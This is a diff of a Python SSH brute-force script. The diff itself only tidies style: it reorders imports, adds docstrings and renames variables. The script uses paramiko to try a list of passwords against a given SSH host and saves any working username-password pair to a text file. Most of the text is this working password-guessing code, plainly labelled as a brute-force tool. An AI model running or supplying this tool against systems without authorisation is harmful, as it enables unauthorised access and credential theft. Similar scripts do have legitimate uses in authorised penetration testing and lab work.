@@ -1,7 +1,10 @@
-from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
-import socket
-import time
+"""
+SSH Bruteforce script.
+"""
 import argparse
+import time
+import socket
+from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
 from colorama import init, Fore
 
 init()
@@ -12,10 +15,11 @@ BLUE = Fore.BLUE
 
 
 def ssh_checker(hostname, username, password, port):
-    c = SSHClient()
-    c.set_missing_host_key_policy(AutoAddPolicy())
+    """SSH connect and login checker"""
+    client = SSHClient()
+    client.set_missing_host_key_policy(AutoAddPolicy())
     try:
-        c.connect(
+        client.connect(
             hostname=hostname,
             username=username,
             password=password,
@@ -40,6 +44,7 @@ def ssh_checker(hostname, username, password, port):
 
 
 def main():
+    """Entry"""
     parser = argparse.ArgumentParser(description="SSH Bruteforce script.")
     parser.add_argument("host", help="Hostname or IP Address of SSH Server.")
     parser.add_argument(
@@ -63,8 +68,8 @@ def main():
 
     for password in pass_list:
         if ssh_checker(host_ip, user_name, password, port_num):
-            with open("credential_pairs.txt", "w") as w:
-                w.write(f"{user_name}@{host_ip}: {password}")
+            with open("credential_pairs.txt", "w") as file:
+                file.write(f"{user_name}@{host_ip}: {password}")
                 break
 
 
